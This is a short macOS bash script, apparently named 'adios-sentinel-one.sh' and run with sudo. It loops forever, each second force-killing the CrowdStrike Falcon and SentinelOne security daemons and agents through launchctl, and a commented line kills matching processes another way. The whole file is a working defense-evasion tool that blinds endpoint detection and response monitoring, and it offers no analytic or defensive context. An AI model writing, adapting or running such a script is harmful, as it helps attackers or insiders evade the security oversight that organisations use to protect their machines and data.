#!/usr/bin/env bash

# Usage: sudo ./adios-sentinel-one.sh

# ps aux | grep sentinel | awk -F "  +" '{print $2}' | xargs kill
while true; do
    launchctl kill SIGKILL system/com.crowdstrike.falcond
    launchctl kill SIGKILL system/com.crowdstrike.userdaemon
    launchctl kill SIGKILL system/com.sentinelone.sentineld
    launchctl kill SIGKILL system/com.sentinelone.sentineld-helper
    launchctl kill SIGKILL system/com.sentinelone.sentineld-guard
    launchctl kill SIGKILL system/com.sentinelone.sentineld-updater
    launchctl kill SIGKILL gui/502/com.sentinelone.agent
    sleep 1
done
